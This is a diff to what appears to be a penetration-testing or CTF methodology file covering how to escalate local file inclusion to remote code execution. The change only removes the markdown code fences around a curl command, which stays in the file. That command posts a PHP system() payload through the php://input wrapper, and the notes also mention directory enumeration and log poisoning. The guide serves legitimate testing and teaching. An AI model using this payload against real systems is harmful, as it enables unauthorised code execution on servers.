@@ -319,10 +319,9 @@ gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x ph
     2. Enumeration for RCE Pre-requisites: Once LFI is confirmed, check for RCE possibilities immediately.
       - Check allow_url_include via Wrappers. Check if the server allows execution of input streams (quickest RCE).
         Send a POST request.
-        
-        ```bash
+
         curl -X POST -d "<?php system('whoami');?>" "http://<target_ip>/<target_php>?<parameter>=php://input"
-        ```
+        
 
         If command output is returned, allow_url_include is ON.
       - Locate Log Files (For Log Poisoning). Attempt to read standard log paths to confirm read access and path location. 
